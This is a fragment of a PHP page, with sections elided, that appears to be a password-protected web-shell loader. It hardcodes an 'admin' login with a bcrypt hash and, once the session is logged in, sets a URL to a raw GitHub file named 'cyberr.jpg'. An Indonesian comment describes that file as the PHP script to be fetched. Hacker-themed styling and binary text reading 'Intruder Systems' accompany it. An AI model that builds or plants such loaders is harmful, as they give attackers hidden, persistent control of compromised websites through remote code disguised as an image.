...
$username = "admin";
$passwordHash = '$2a$12$1ZNmMjwVGvkz.fREMN5UWer33AfZDgAHSXKVv6D6hfuvJivG9AJNu'; // Hash bcrypt
...
if (isset($_SESSION['loggedin'])) {
    $url = 'https://raw.githubusercontent.com/gayusinhere/Code/main/cyberr.jpg'; // Ganti URL dengan lokasi script PHP yang ingin diambil
        ...
        <style>
            ...
            * {
            ...
            @keyframes floatBinary {
                ...
                75% { transform: translate(10px, -15px); }100% { transform: translate(0, 0); }
            }
        </style>
    </head>
    <body>
        ...
        <div class="cyber-binary binary-1">
            01001001 01101110 01110100 01110010 01110101 01100100 01100101 01110010 00100000 01010011 01111001 01110011 01110100 01100101 01101101 01110011</div>
